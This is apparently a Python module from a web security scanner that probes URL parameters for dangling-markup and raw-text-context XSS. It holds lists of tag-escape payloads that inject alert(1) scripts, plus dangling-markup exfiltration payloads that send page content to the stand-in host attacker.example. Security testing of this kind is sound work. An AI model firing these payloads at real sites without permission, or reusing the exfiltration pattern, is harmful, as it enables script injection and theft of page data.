"""Dangling markup injection — context escape via unclosed tags."""

from __future__ import annotations

import re
from dataclasses import dataclass

import httpx


# Escape out of noscript, select, textarea, template — browsers parse these differently
DANGLING_PAYLOADS = [
    # </textarea> escape — content inside textarea is raw text
    '</textarea><script>alert(1)</script>',
    '</textarea><img src=x onerror=alert(1)>',
    '</textarea><svg onload=alert(1)>',

    # </select> escape — option text treated as raw
    '</select><script>alert(1)</script>',
    '</select><img src=x onerror=alert(1)>',

    # </noscript> escape — only parses as HTML when JS disabled, useful for CSP bypass
    '</noscript><script>alert(1)</script>',
    '</noscript><img src=x onerror=alert(1)>',

    # </template> escape — template content not rendered, but closing it leaks into DOM
    '</template><script>alert(1)</script>',
    '</template><img src=x onerror=alert(1)>',

    # </style> escape — raw text context like textarea
    '</style><script>alert(1)</script>',
    '</style><svg onload=alert(1)>',

    # </title> escape
    '</title><script>alert(1)</script>',

    # </script> escape — if inside an existing script block
    '</script><script>alert(1)</script>',
    '</script><img src=x onerror=alert(1)>',

    # </iframe> srcdoc injection
    '</iframe><script>alert(1)</script>',
]

# Dangling markup data exfil (inject open tag that slurps subsequent markup)
DANGLING_EXFIL_PAYLOADS = [
    '<img src="https://attacker.example/log?q=',         # slurps to next quote
    "<a href='https://attacker.example/log?q=",          # slurps to next single quote
    '<form action="https://attacker.example/log">',
]

ALL_DANGLING_PAYLOADS = DANGLING_PAYLOADS + DANGLING_EXFIL_PAYLOADS

# Context patterns indicating raw-text elements in page source
_RAW_TEXT_CONTEXTS = re.compile(
    r'<(textarea|select|noscript|template|style|title|script)[^>]*>',
    re.I,
)


@dataclass
class DanglingFinding:
    type: str = "dangling_markup"
    url: str = ""
    param: str = ""
    payload: str = ""
    context: str = ""          # which raw-text container was escaped
    evidence: str = ""
    severity: str = "P2"


class DanglingMarkup:
    """Identifies raw-text element contexts and tests closure escapes."""

    def __init__(self, session: httpx.Client | None = None):
        self.session = session or httpx.Client(timeout=20, follow_redirects=True)

    def scan(self, url: str, param: str) -> list[DanglingFinding]:
        context = self._detect_context(url, param)
        findings: list[DanglingFinding] = []
        targeted = self._payloads_for_context(context)
        for payload in targeted:
            f = self._test(url, param, payload, context)
            if f:
                findings.append(f)
        return findings

    def _detect_context(self, url: str, param: str) -> str:
        """Probe to find which raw-text element the param is reflected inside."""
        try:
            resp = self.session.get(url, params={param: "XSSCTXPROBE"})
            body = resp.text
        except Exception:
            return "unknown"
        idx = body.find("XSSCTXPROBE")
        if idx < 0:
            return "unknown"
        surrounding = body[max(0, idx - 300): idx]
        for m in _RAW_TEXT_CONTEXTS.finditer(surrounding):
            return m.group(1).lower()
        return "html"

    def _payloads_for_context(self, context: str) -> list[str]:
        if context in ("textarea", "select", "noscript", "template", "style", "title", "script"):
            prefix = f"</{context}>"
            targeted = [p for p in DANGLING_PAYLOADS if p.startswith(prefix)]
            return targeted or DANGLING_PAYLOADS
        return DANGLING_PAYLOADS

    def _test(self, url: str, param: str, payload: str, context: str) -> DanglingFinding | None:
        try:
            resp = self.session.get(url, params={param: payload})
        except Exception:
            return None
        body = resp.text
        if payload not in body and "<script" not in body and "onerror" not in body:
            return None
        idx = body.find(payload[:20]) if payload[:20] in body else 0
        evidence = body[max(0, idx - 50): idx + 120].replace("\n", "\\n")
        return DanglingFinding(
            url=url, param=param, payload=payload,
            context=context, evidence=evidence,
        )
